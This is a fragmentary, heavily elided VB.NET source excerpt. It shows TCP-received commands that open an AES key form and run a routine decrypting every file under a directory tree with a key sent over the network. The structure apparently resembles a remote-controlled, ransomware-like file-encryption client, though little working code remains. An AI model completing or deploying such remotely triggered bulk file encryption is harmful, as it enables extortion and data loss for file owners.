...
Public Class MainCL
    ...
    ' Public Shared Helper As String
    '  Public 
    ...
    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
        ...
        If h(1) = Algo_Op.AES_ENC Then
            ...
            Dim o As New PL.Class2(h(2), PL.Class2.Algo.AES)
            ...
            o.RichTextBox1.Text = h(3)

            Dim HS As New Threading.Thread(Sub() Application.Run(o))
            HS.Start()


        ElseIf h(1) = Algo_Op.AES_DEC Then


            Await Task.Run(Sub() Decrypt(h(2)))
    ...
    End Sub
    Public Shared Async Sub Decrypt(ByVal L As String)
        '  If ALG = 0 Then
        ...
        For Each F In Directory.GetFiles(P, "*.*", SearchOption.AllDirectories)
            ...
            Try
                ...
                Dim AES As New CryptoHelper.AES(B, L, False)
    ...
    Public Shared Async Sub ST2(ByVal k As TcpClient, ByVal l As String)
        Dim h As String() = Split(l, "|SP2|")
